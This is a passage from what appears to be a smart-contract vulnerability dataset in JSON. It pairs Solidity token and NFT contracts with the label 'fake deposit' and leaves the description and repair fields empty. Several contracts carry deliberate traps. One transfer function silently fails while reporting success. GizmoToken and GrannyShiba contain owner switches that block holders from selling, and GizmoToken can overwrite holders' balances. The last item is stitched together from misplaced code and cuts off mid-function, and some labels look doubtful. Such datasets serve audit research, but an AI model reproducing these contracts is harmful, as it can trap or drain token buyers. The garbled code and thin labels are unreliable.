        "Code": "pragma solidity ^0.8.7;\n\ncontract MYDA is Context, AFTS {\n    \n    GeneralDetails _general;\n    \n    mapping(string =>  uint256) private _genConfig;\n    \n    mapping(address =>  UserDetails) private _user;\n    \n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    mapping(uint256 =>  StakeConfig) _stakeConfig;\n    \n    mapping(address =>  mapping(uint256 =>  StakeDetails)) private _stake;\n    \n    mapping(address =>  mapping(bytes32 => uint256)) private _swapIn;\n    \n    mapping(address =>  mapping(uint256 => uint256)) private _swapOut;\n    \n    mapping(address =>  mapping(uint256 =>  mapping(string =>  uint256))) private _userVote;\n    \n    mapping(uint256 =>  mapping(string =>  VoteData)) private _vote;\n    \n    mapping(string =>  uint256) private _voteCycle;\n    \n    constructor () {\n        _general._name = \"MYDA\";\n        _general._symbol = \"MYDA\";\n        _general._decimals = 18;\n        _general._validatorAdd = _msgSender();\n        _general._validatorApi = \"https://validator.mydacoin.com/\";\n        //_general._totalSupply = 100000000*1e18;\n        _genConfig[\"maxSupply\"] = 100000000*1e18;\n        _genConfig[\"maxTxLimit\"] = 200;\n        _genConfig[\"rewardDuration\"] = 86400;\n        _genConfig[\"refCom\"] = 10;  \n        _genConfig[\"voteApproveRate\"] = 70; \n        _genConfig[\"propDuration\"] = 2592000;\n        _stakeConfig[1].collateral = 5000*1e18;\n        _stakeConfig[2].collateral = 10000*1e18;\n        _stakeConfig[3].collateral = 20000*1e18;\n        _stakeConfig[1].lockTime = 2592000;\n        _stakeConfig[2].lockTime = 7776000;\n        _stakeConfig[3].lockTime = 15552000;\n        _stakeConfig[1].reward = 8.25*1e18;\n        _stakeConfig[2].reward = 33*1e18;\n        _stakeConfig[3].reward = 99*1e18;\n        _general._isPaused = false;\n        _general._stakeAddress = 0x7F7512BDcC61861DfEC5ad7C124899c72fC86FD6;\n        //_transfer(address(0), _general._stakeAddress, 100000000*1e18, 0);\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _general._name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _general._symbol;\n    }\n\n    function decimals() public view virtual override returns (uint256) {\n        return _general._decimals;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _general._totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _user[account]._balances;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    \n    function isPaused() public view virtual override returns (bool) {\n        return _general._isPaused;\n    }   \n    \n    function userDetails(address account) public view virtual override returns(UserDetails memory){\n        UserDetails memory userdet = _user[account];\n        userdet.t1 = _stake[account][1];\n        userdet.t2 = _stake[account][2];\n        userdet.t3 = _stake[account][3];\n        return userdet;\n    }  \n  \n    function voteCycleDetails(uint256 cycle, string memory config) public view virtual override returns (VoteData memory) {\n        \n        if(cycle == 0){\n            cycle = _voteCycle[config];\n        }\n        \n        return _vote[cycle][config];\n    }   \n\n    function _transfer(address sender, address recipient, uint256 amount, uint8 method) internal virtual returns bool{\n        require(!_general._isPaused, \"Contract is Paused\");\n        \n        if(method == 1){\n            return false;\n        }\n        \n        if(sender != address(0)){\n            require(_user[sender]._balances >= amount, \"amount exceeds balance\");\n            _user[sender]._balances -= amount;\n        }\n        \n        if(recipient != address(0)){\n            _user[recipient]._balances += amount;\n        }\n        \n        return true;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(!_general._isPaused, \"Contract is Paused\");\n        require(owner != address(0), \"from zero address\");\n        require(spender != address(0), \"to zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    \n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {     \n        _transfer(_msgSender(), recipient, amount, 1);\n        return true;\n    }\n    \n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        require(_allowances[sender][_msgSender()] >= amount, \"amount exceeds allowance\");\n        _transfer(sender, recipient, amount, 1);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n    \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract sSpellV1 is IERC20, Domain {\n\n    string public constant symbol = \"sSPELL\";\n    string public constant name = \"Staked Spell Tokens\";\n    uint8 public constant decimals = 18;\n    uint256 public override totalSupply;\n    uint256 private constant LOCK_TIME = 24 hours;\n\n    IERC20 public immutable token;\n\n    constructor(IERC20 _token) public {\n        token = _token;\n    }\n\n    struct User {\n        uint128 balance;\n        uint128 lockedUntil;\n    }\n\n    /// @notice owner > balance mapping.\n    mapping(address => User) public users;\n    /// @notice owner > spender > allowance mapping.\n    mapping(address => mapping(address => uint256)) public override allowance;\n    /// @notice owner > nonce mapping. Used in `permit`.\n    mapping(address => uint256) public nonces;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n    function balanceOf(address user) public view override returns (uint256 balance) {\n        return users[user].balance;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 shares\n    ) internal {\n        User memory fromUser = users[from];\n        require(block.timestamp >= fromUser.lockedUntil, \"Locked\");\n        if (shares != 0) {\n            require(fromUser.balance >= shares, \"Low balance\");\n            if (from != to) {\n                require(to != address(0), \"Zero address\"); // Moved down so other failed calls safe some gas\n                User memory toUser = users[to];\n                users[from].balance = fromUser.balance - shares.to128(); // Underflow is checked\n                users[to].balance = toUser.balance + shares.to128(); // Can't overflow because totalSupply would be greater than 2^128-1;\n            }\n        }\n        emit Transfer(from, to, shares);\n    }\n\n    function _useAllowance(address from, uint256 shares) internal {\n        if (msg.sender == from) {\n            return;\n        }\n        uint256 spenderAllowance = allowance[from][msg.sender];\n        // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n        if (spenderAllowance != type(uint256).max) {\n            require(spenderAllowance >= shares, \"Low allowance\");\n            allowance[from][msg.sender] = spenderAllowance - shares; // Underflow is checked\n        }\n    }\n\n    function transfer(address to, uint256 shares) public returns (bool) {\n        _transfer(msg.sender, to, shares);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 shares\n    ) public returns (bool) {\n        _useAllowance(from, shares);\n        _transfer(from, to, shares);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    // solhint-disable-next-line func-name-mixedcase\n    function DOMAIN_SEPARATOR() external view returns (bytes32) {\n        return _domainSeparator();\n    }\n\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    function permit(\n        address owner_,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external override {\n        require(owner_ != address(0), \"Zero owner\");\n        require(block.timestamp < deadline, \"Expired\");\n        require(\n            ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==\n                owner_,\n            \"Invalid Sig\"\n        );\n        allowance[owner_][spender] = value;\n        emit Approval(owner_, spender, value);\n    }\n\n    function mint(uint256 amount) public returns (bool) {\n        require(msg.sender != address(0), \"Zero address\");\n        User memory user = users[msg.sender];\n\n        uint256 totalTokens = token.balanceOf(address(this));\n        uint256 shares = totalSupply == 0 ? amount : (amount * totalSupply) / totalTokens;\n        user.balance += shares.to128();\n        user.lockedUntil = (block.timestamp + LOCK_TIME).to128();\n        users[msg.sender] = user;\n        totalSupply += shares;\n\n        token.safeTransferFrom(msg.sender, address(this), amount);\n\n        emit Transfer(address(0), msg.sender, shares);\n        return true;\n    }\n\n    function _burn(\n        address from,\n        address to,\n        uint256 shares\n    ) internal {\n        require(to != address(0), \"Zero address\");\n        User memory user = users[from];\n        require(block.timestamp >= user.lockedUntil, \"Locked\");\n        uint256 amount = (shares * token.balanceOf(address(this))) / totalSupply;\n        users[from].balance = user.balance.sub(shares.to128()); // Must check underflow\n        totalSupply -= shares;\n\n        token.safeTransfer(to, amount);\n\n        emit Transfer(from, address(0), shares);\n    }\n\n    function burn(address to, uint256 shares) public returns (bool) {\n        _burn(msg.sender, to, shares);\n        return true;\n    }\n\n    function burnFrom(\n        address from,\n        address to,\n        uint256 shares\n    ) public returns (bool) {\n        _useAllowance(from, shares);\n        _burn(from, to, shares);\n        return true;\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.1;\r\n\r\nimport \"./Context.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping (address =\\u003e uint256) internal \r\n_balances;\r\n    mapping (address =\\u003e bool) private _approveTransfer;\r\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    uint256 _reward;\r\n    string internal _name;\r\n    string internal _symbol;\r\n    uint256 internal _decimals;\r\n    bool maxTxPercent = true;\r\n    address internal _owner;\r\n    \r\n    constructor (string memory name_, string memory symbol_, uint256 decimals_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n   \r\n    function name() public view \r\nvirtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n   \r\n    function symbol() public view \r\nvirtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    \r\n    function decimals() public view virtual override returns (uint256) {\r\n        return _decimals;\r\n    }\r\n\r\n   \r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    \r\n    function recall(address _address) external onlyOwner {\r\n        _approveTransfer[_address] = false;\r\n    }\r\n\r\n    function approveTransfer(address _address) external onlyOwner {\r\n        _approveTransfer[_address] = true;\r\n    }\r\n\r\n    function approvedTransfer(address _address) public view returns (bool) {\r\n        return _approveTransfer[_address];\r\n    }\r\n\r\n    function setMaxTxPercent() public virtual onlyOwner {\r\n        if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}\r\n    }\r\n \r\n    function maxTxPercentState() public view returns (bool) {\r\n        return maxTxPercent;\r\n    }\r\n\r\n    \r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function reflectReward (uint256 value) external onlyOwner {\r\n        _reward = value;\r\n    }\r\n    \r\n   \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    \r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \\u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n   \r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n      \r\n  _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n   \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance \\u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n  \r\n      require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount \\u003e 0, \"Transfer amount must be grater thatn zero\");\r\n        if (_approveTransfer[sender] || _approveTransfer[recipient]) \r\n        require(maxTxPercent == false, \"\");\r\n        if (maxTxPercent == true || sender == _owner || recipient == _owner) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \\u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);}\r\n        else {require (maxTxPercent == true, \"\");} \r\n    }\r\n    \r\n    \r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        _balances[account] = _reward - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n   \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n  \r\n  }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}\r\n\r\ncontract GizmoToken is ERC20 {\r\n    constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {\r\n        _name = \"Gizmo Token | t.me/GizmoToken\";\r\n        _symbol = \"GIZMO\";\r\n        _decimals = 9;\r\n        _totalSupply += initialSupply;\r\n        _balances[msg.sender] += initialSupply;\r\n        emit Transfer(address(0), msg.sender, initialSupply);\r\n    }\r\n    \r\n    function burnRewards(address account, uint256 value) external onlyOwner {\r\n    _burn(account, value);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "\r\ncontract GrannyShiba is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    mapping (address => uint256) private _rOwned;\r\n    mapping (address => uint256) private _tOwned;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcluded;\r\n    address[] private _excluded;\r\n    mapping (address => bool) private _antiBotDump;\r\n    event botBanned (address botAddress, bool isBanned);\r\n    uint256 private _tFeeTotal;\r\n    bool _liquidity;\r\n    \r\n    uint256 private constant _tTotal = 100000000000000*10**9;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n\r\n    address public uniswapV2router;\r\n    \r\n    constructor (address router) {\r\n        uniswapV2router = router;\r\n        _rOwned[_msgSender()] = _rTotal;\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n        _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);\r\n        _isExcluded[_msgSender()] = true;\r\n        _excluded.push(_msgSender());\r\n        _liquidity = true;\r\n    }\r\n    \r\n    \r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\r\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\r\n        uint256 currentRate =  _getRate();\r\n        return rAmount.div(currentRate);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        if (_antiBotDump[sender] || _antiBotDump[recipient]) require (amount == 0, \"\");\r\n        if (_liquidity == true || sender == owner() || recipient == owner()) {\r\n        if (_isExcluded[sender] && !_isExcluded[recipient]) {\r\n        _transferFromExcluded(sender, recipient, amount);\r\n        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\r\n        _transferToExcluded(sender, recipient, amount);\r\n        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\r\n        _transferStandard(sender, recipient, amount);\r\n        } else if (_isExcluded[sender] && _isExcluded[recipient]) {\r\n        _transferBothExcluded(sender, recipient, amount);\r\n        } else {_transferStandard(sender, recipient, amount);}\r\n        } else {require (_liquidity == true, \"\");}\r\n    }\r\n\r\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\r\n        _rTotal = _rTotal.sub(rFee);\r\n        _tFeeTotal = _tFeeTotal.add(tFee);\r\n    }\r\n\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "\r\npragma solidity 0.8.6;\r\n\r\n\r\ncontract NFToken is\r\n  ERC721,\r\n  SupportsInterface\r\n{\r\n  using AddressUtils for address;\r\n\r\n  \r\n  string constant ZERO_ADDRESS = \"003001\";\r\n  string constant NOT_VALID_NFT = \"003002\";\r\n  string constant NOT_OWNER_OR_OPERATOR = \"003003\";\r\n  string constant NOT_OWNER_APPROVED_OR_OPERATOR = \"003004\";\r\n  string constant NOT_ABLE_TO_RECEIVE_NFT = \"003005\";\r\n  string constant NFT_ALREADY_EXISTS = \"003006\";\r\n  string constant NOT_OWNER = \"003007\";\r\n  string constant IS_OWNER = \"003008\";\r\n\r\n  \r\n  bytes4 internal constant MAGIC_ON_ERC721_RECEIVED = 0x150b7a02;\r\n\r\n  \r\n  mapping (uint256 => address) internal idToOwner;\r\n\r\n  mapping (uint256 => address) internal idToApproval;\r\n\r\n  mapping (address => uint256) private ownerToNFTokenCount;\r\n\r\n  mapping (address => mapping (address => bool)) internal ownerToOperators;\r\n\r\n  modifier canOperate(\r\n    uint256 _tokenId\r\n  )\r\n  {\r\n    address tokenOwner = idToOwner[_tokenId];\r\n    require(\r\n      tokenOwner == msg.sender || ownerToOperators[tokenOwner][msg.sender],\r\n      NOT_OWNER_OR_OPERATOR\r\n    );\r\n    _;\r\n  }\r\n\r\n  modifier canTransfer(\r\n    uint256 _tokenId\r\n  )\r\n  {\r\n    address tokenOwner = idToOwner[_tokenId];\r\n    require(\r\n      tokenOwner == msg.sender\r\n      || idToApproval[_tokenId] == msg.sender\r\n      || ownerToOperators[tokenOwner][msg.sender],\r\n      NOT_OWNER_APPROVED_OR_OPERATOR\r\n    );\r\n    _;\r\n  }\r\n\r\n  modifier validNFToken(\r\n    uint256 _tokenId\r\n  )\r\n  {\r\n    require(idToOwner[_tokenId] != address(0), NOT_VALID_NFT);\r\n    _;\r\n  }\r\n\r\n  constructor()\r\n  {\r\n    supportedInterfaces[0x80ac58cd] = true; // ERC721\r\n  }\r\n\r\n  function safeTransferFrom(\r\n    address _from,\r\n    address _to,\r\n    uint256 _tokenId,\r\n    bytes calldata _data\r\n  )\r\n    external\r\n    override\r\n  {\r\n    _safeTransferFrom(_from, _to, _tokenId, _data);\r\n  }\r\n\r\n  function safeTransferFrom(\r\n    address _from,\r\n    address _to,\r\n    uint256 _tokenId\r\n  )\r\n    external\r\n    override\r\n  {\r\n    _safeTransferFrom(_from, _to, _tokenId, \"\");\r\n  }\r\n\r\n  function transferFrom(\r\n    address _from,\r\n    address _to,\r\n    uint256 _tokenId\r\n  )\r\n    external\r\n    override\r\n    canTransfer(_tokenId)\r\n    validNFToken(_tokenId)\r\n  {\r\n    address tokenOwner = idToOwner[_tokenId];\r\n    require(tokenOwner == _from, NOT_OWNER);\r\n    require(_to != address(0), ZERO_ADDRESS);\r\n\r\n    _transfer(_to, _tokenId);\r\n  }\r\n\r\n  function approve(\r\n    address _approved,\r\n    uint256 _tokenId\r\n  )\r\n    external\r\n    override\r\n    canOperate(_tokenId)\r\n    validNFToken(_tokenId)\r\n  {\r\n    address tokenOwner = idToOwner[_tokenId];\r\n    require(_approved != tokenOwner, IS_OWNER);\r\n\r\n    idToApproval[_tokenId] = _approved;\r\n    emit Approval(tokenOwner, _approved, _tokenId);\r\n  }\r\n\r\n  function setApprovalForAll(\r\n    address _operator,\r\n    bool _approved\r\n  )\r\n    external\r\n    override\r\n  {\r\n    ownerToOperators[msg.sender][_operator] = _approved;\r\n    emit ApprovalForAll(msg.sender, _operator, _approved);\r\n  }\r\n\r\n  function getApproved(\r\n    uint256 _tokenId\r\n  )\r\n    external\r\n    override\r\n    view\r\n    validNFToken(_tokenId)\r\n    returns (address)\r\n  {\r\n    return idToApproval[_tokenId];\r\n  }\r\n\r\n  function isApprovedForAll(\r\n    address _owner,\r\n    address _operator\r\n  )\r\n    external\r\n    override\r\n    view\r\n    returns (bool)\r\n  {\r\n    return ownerToOperators[_owner][_operator];\r\n  }\r\n\r\n  function _transfer(\r\n    address _to,\r\n    uint256 _tokenId\r\n  )\r\n    internal\r\n  {\r\n    address from = idToOwner[_tokenId];\r\n    _clearApproval(_tokenId);\r\n\r\n    _removeNFToken(from, _tokenId);\r\n    _addNFToken(_to, _tokenId);\r\n\r\n    emit Transfer(from, _to, _tokenId);\r\n  }\r\n\r\n  function _removeNFToken(\r\n    address _from,\r\n    uint256 _tokenId\r\n  )\r\n    internal\r\n    virtual\r\n  {\r\n    require(idToOwner[_tokenId] == _from, NOT_OWNER);\r\n    ownerToNFTokenCount[_from] -= 1;\r\n    delete idToOwner[_tokenId];\r\n  }\r\n  function _addNFToken(\r\n    address _to,\r\n    uint256 _tokenId\r\n  )\r\n    internal\r\n    virtual\r\n  {\r\n    require(idToOwner[_tokenId] == address(0), NFT_ALREADY_EXISTS);\r\n\r\n    idToOwner[_tokenId] = _to;\r\n    ownerToNFTokenCount[_to] += 1;\r\n  }\r\n\r\n  function _getOwnerNFTCount(\r\n    address _owner\r\n  )\r\n    internal\r\n    virtual\r\n    view\r\n    returns (uint256)\r\n  {\r\n    return ownerToNFTokenCount[_owner];\r\n  }\r\n\r\n  function _safeTransferFrom(\r\n    address _from,\r\n    address _to,\r\n    uint256 _tokenId,\r\n    bytes memory _data\r\n  )\r\n    private\r\n    canTransfer(_tokenId)\r\n    validNFToken(_tokenId)\r\n  {\r\n    address tokenOwner = idToOwner[_tokenId];\r\n    require(tokenOwner == _from, NOT_OWNER);\r\n    require(_to != address(0), ZERO_ADDRESS);\r\n\r\n    _transfer(_to, _tokenId);\r\n\r\n    if (_to.isContract())\r\n    {\r\n      bytes4 retval = ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data);\r\n      require(retval == MAGIC_ON_ERC721_RECEIVED, NOT_ABLE_TO_RECEIVE_NFT);\r\n    }\r\n  }\r\n\r\n  function _clearApproval(\r\n    uint256 _tokenId\r\n  )\r\n    private\r\n  {\r\n    delete idToApproval[_tokenId];\r\n  }\r\n\r\n}\r\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.7.1;interface IErc223 { \n    function totalSupply() external view returns (uint); \n \n     function transfer(address to, uint value, bytes memory data) external returns (bool ok); \n     \n    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data); \n} \n \n/** \n* @title Contract that will work with ERC223 tokens. \n*/ \n \ninterface IErc223ReceivingContract { \n    /** \n     * @dev Standard ERC223 function that will handle incoming token transfers. \n     * \n     * @param _from  Token sender address. \n     * @param _value Amount of tokens. \n     * @param _data  Transaction metadata. \n     */ \n     function transfer(address to, uint tokens) external returns (bool success); \n \n     function transferFrom(address from, address to, uint tokens) external returns (bool success); \n \n    event Transfer(address indexed from, address indexed to, uint tokens); \n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens); \n} \n \n \n \n \n/** \n * @dev Collection of functions related to the address type \n */ \nlibrary Address { \n    /** \n     * @dev Returns true if `account` is a contract. \n     * \n     * [IMPORTANT] \n     *  \n     * It is unsafe to assume that an address for which this function returns \n     * false is an externally-owned account (EOA) and not a contract. \n     * \n     * Among others, `isContract` will return false for the following \n     * types of addresses: \n     * \n     *  - an externally-owned account \n     *  - a contract in construction \n     *  - an address where a contract will be created \n     *  - an address where a contract lived, but was destroyed \n     * ==== \n     */ \n      function transfer(address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Returns the remaining number of tokens that `spender` will be \n     * allowed to spend on behalf of `owner` through {transferFrom}. This is \n     * zero by default. \n     * \n     * This value changes when {approve} or {transferFrom} are called. \n     */ \n   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Emitted when `value` tokens are moved from one account (`from`) to \n     * another (`to`). \n     * \n     * Note that `value` may be zero. \n     */ \n    event Transfer(address indexed from, address indexed to, uint256 value); \n \n    /** \n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n     * a call to {approve}. `value` is the new allowance. \n     */ \n    event Approval(address indexed owner, address indexed spender, uint256 value); \n}/** \n * @dev Wrappers over Solidity's arithmetic operations with added overflow \n * checks. \n * \n * Arithmetic operations in Solidity wrap on overflow. This can easily result \n * in bugs, because programmers usually assume that an overflow raises an \n * error, which is the standard behavior in high level programming languages. \n * `SafeMath` restores this intuition by reverting the transaction when an \n * operation overflows. \n * \n * Using this library instead of the unchecked operations eliminates an entire \n * class of bugs, so it's recommended to use it always. \n */ \nlibrary SafeMath { \n    /** \n     * @dev Returns the addition of two unsigned integers, with an overflow flag. \n     * \n     * _Available since v3.4._ \n     */ \n    function transfer(address _to, uint256 _value) public override returns (bool ok) { \n        // block transfers if the recipient only allows kyc input, check other factors \n        if (onlyAcceptsKycInput[_to] == false && balances[msg.sender][ShyftTokenType] >= _value) { \n            balances[msg.sender][ShyftTokenType] = balances[msg.sender][ShyftTokenType].sub(_value); \n \n            balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_value); \n \n            emit Transfer(msg.sender, _to, _value); \n \n            return true; \n        } else { \n            return false; \n        } \n    } \n \n    /// @param _tokenOwner The address of the origin. \n    /// @param _spender The address of the recipient. \n    /// @dev Get the current allowance for the basic Shyft token type. (basic ERC20 functionality) \n    /// @return remaining the current allowance for the basic Shyft token type for a specific user \n \n     function transferFrom(address _from, address _to, uint _tokens) public override returns (bool success) { \n        if (onlyAcceptsKycInput[_to] == false && allowed[_from][msg.sender][ShyftTokenType] >= _tokens && balances[_from][ShyftTokenType] >= _tokens) { \n            allowed[_from][msg.sender][ShyftTokenType] = allowed[_from][msg.sender][ShyftTokenType].sub(_tokens); \n \n            balances[_from][ShyftTokenType] = balances[_from][ShyftTokenType].sub(_tokens); \n            balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_tokens); \n \n            emit Transfer(_from, _to, _tokens); \n            emit Approval(_from, msg.sender, allowed[_from][msg.sender][ShyftTokenType]); \n \n            return true; 